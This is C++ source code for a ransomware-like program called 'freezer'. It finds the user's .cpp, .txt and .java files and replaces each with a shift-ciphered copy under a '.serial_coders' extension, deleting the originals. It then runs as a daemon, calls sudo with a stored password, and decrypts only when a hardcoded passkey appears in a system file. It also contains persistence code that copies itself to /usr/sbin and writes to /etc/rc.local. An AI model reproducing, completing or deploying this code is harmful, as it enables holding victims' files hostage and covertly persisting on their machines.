#include <bits/stdc++.h>
#include<iostream>
#include<syslog.h>
#include<errno.h>
#include<stdlib.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdio.h>
#include<sys/stat.h>
using namespace std;

int key=1;

fstream fin,fout,lin,sysfin,sysfout;
string file_name,ext;

void decrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        fout<<a;      
    }
}

void encrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a-key)%128;
        fout<<a;      
    }
}

string file_name_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(0,i);
        }
    }   
}

string extention_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(i+1,str.size()-i-1);
        }
    }   
}

void encrypter(string input)//gets filename+path
{
    string str;
    
    //add extention serial_coders and open as fout
    file_name+=".serial_coders";
    fout.open(file_name.c_str(),ios::out );
    
    //write encrypted extention to first line of encrypted file
    str=extention_extractor(input);
    encrypt(ext,1);
    fout<<endl;
    
    //write rest of encrypted code to file
    while(true)
	{
	    getline(fin,str);
	    encrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void decrypter(string input)//gets filename+path
{
    string str;
    
    //add orig extention to file_name and open as fout
	getline(fin,str);
	char a;
	file_name+=".";
	for(int i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        file_name+=a;     
    }
    fout.open(file_name.c_str(),ios::out );
    
    while(true)
	{
	    getline(fin,str);
	    decrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void list_gen(){
     string command = " \
        #get location of current dir \
        SOURCE=""${BASH_SOURCE[0]}"" \
        while [ -h ""$SOURCE"" ]; do # resolve $SOURCE until the file is no longer a symlink \
          DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
          SOURCE=""$(readlink ""$SOURCE"")"" \
          [[ $SOURCE != /* ]] && SOURCE=""$DIR/$SOURCE"" # if $SOURCE was a relative symlink, we need to resolve it  \
        done \
        DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
        \
        dir_pres=$DIR \
        if [ -f $dir_pres/.files ] ; then \
        rm $dir_pres/.files \
        fi \
        cd $HOME \
        file0=""*.cpp */*.cpp */*/*.cpp */*/*/*.cpp */*/*/*/*.cpp "" \
        file1=""*.txt */*.txt */*/*.txt */*/*/*.txt */*/*/*/*.txt"" \
        file2=""*.java */*.java */*/*.java */*/*/*.java */*/*/*/*.java"" \
        for i in $file0 $file1 $file2; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/.files ; done | sort \
        pwd\
        if [ -f $dir_pres/.encrypted_list ] ; then \
            rm $dir_pres/.encrypted_list \
            fi \
        file3=""*.serial_coders */*.serial_coders */*/*.serial_coders */*/*/*.serial_coders */*/*/*/*.serial_coders"" \
        for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/.encrypted_list ; done | sort \
        ";

   // system(command.c_str());//dont know why it is not working 
    system("./.list_gen.sh");
}

void enc_dec(string input){//string from lists is a path to a file to be encripted/decripted
    string str;
	
	if(input==""){
	    return;
	}
	
	//open input file as fin
	fin.open(input.c_str(),ios::in);
	
	//seperate file name and extention
	ext=extention_extractor(input);
	file_name=file_name_extractor(input);
	
	if(ext=="serial_coders")//to be decrypted
	{
	    decrypter(input);
	}
	else//to be encrypted
	{
	    encrypter(input);
	}
	
	input="\""+input+"\"";
    str=(string)"rm "+input+" ";
    system(str.c_str());
    
	fin.close();
}

void del_lists()
{
    int encrypted_list_there=0,files_there=0;
    lin.open(".encrypted_list",ios::in);
	if(lin)
	{
	    encrypted_list_there=1;     
	}
    lin.close();
	lin.open(".files",ios::in);
	if(lin)
	{
	    files_there=1;  
	}
	
	//remove if there
	if(encrypted_list_there) system("rm .encrypted_list ");
	if(files_there) system("rm .files ");
	
    lin.close();
}

void list_reader(string task)//calls enc_dec
{
    if(task=="enc")
	{
	    lin.open(".files",ios::in);
	    if(!lin){
	        cout<<".files not found\n";
	        return;
	    }
	}
	else
	{
	    lin.open(".encrypted_list",ios::in);
	    if(!lin){
	        cout<<".encrypted_list not found\n";
	        return;
	    }
	}
	
	string str,command;
    while(true)
	{
	    if(lin.eof()){
	        break;
	    }
	    getline(lin,str);
	    enc_dec(str);
	        
	}
	
	lin.close();
	del_lists();
}

void caller(string input)//calls list reader 
{
    list_gen();
    if(input=="darkmode")//go dark
	{
	    list_reader("enc");
	}
	else if(input=="safemode")//go safe
	{
	    list_reader("dec");
	}
	else{
	    exit(0);
	}
}

void demon(){
  pid_t pid,sid;
    pid=fork();
    if(pid<0){
        exit(EXIT_FAILURE);
    }
    if(pid>0){
        exit(EXIT_SUCCESS);
    }
    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void initFreezer(string input)
{   
    string passkey="hello";
    demon();
	while(true)
	{
	    sleep(4);
	    
	    //call java code of box display
	    system("sudo -k -S java -jar .keybox.jar < .pass > /dev/null 2>&1 ");
	    
	    //code to change value of passkey from a file
	    sysfin.open("/usr/sbin/freezer/.freezekey",ios::in);
	    if(sysfin)
	    {    
	        cout<<"filefound\n";
	        sysfin>>passkey;
	    }    
	    sysfin.close();
	    
	    //call the caller
	    caller(input);
	    
	    if(passkey=="dArkCoders")
	    {
	        input = "safemode";
	        caller("safemode");
	        //del from /usr/sbin/
	        exit(0);
	    }
	} 
}

static const int maxProcessId()
{
    string str;
    sysfin.open("/proc/sys/kernel/pid_max",ios::in);
    if(!sysfin)
        throw std::runtime_error("unable to get the max pid");
    sysfin>>str;
    int maxpid = stoi(str,nullptr,10);
    sysfin.close();
    return maxpid;
}

const bool processAlreadyRunning()
{
    int maxpid = maxProcessId();
    for(int i = 1; i <= maxpid; i++)
    {
        string path = (string)"/proc/" + to_string(i) + (string)"/comm";
        sysfin.open(path,ios::in);
        if(sysfin)
        {
            string str;
            sysfin>>str;
            if( str == "freezer" && i != getpid() )//dont kill itself
            {
                return true;
            }
        }
        sysfin.close();
    }
    return false;
}

const bool checkForConquer()
{
    sysfin.open("/usr/sbin/freezer",ios::in);
    if(!sysfin){
        sysfin.close();
        return false;
    }
    sysfin.close();
    return true;
}

void conquerComputer()
{
    string command = "cp freezer /usr/sbin/";
    system(command.c_str());
    sysfout.open("/etc/rc.local",ios::out|ios::ate);
    sysfout<<"/usr/sbin/freezer\nexit 0";
    sysfout.close();
}

int main(int argc, char *argv[])
{   
    if(processAlreadyRunning())
    {
        cout << "The process is already running\n";
        exit(0);
    }
    
    system("./.utilities.sh");
    
    if(checkForConquer())
    {
       // conquerComputer();//done through shell
    }
    
	string input;
	if(argc==2)
	{
	    input=argv[1];
	}
	else
	{
	    input="darkmode";
	}
	
	initFreezer(input);
	
	return 0;
}
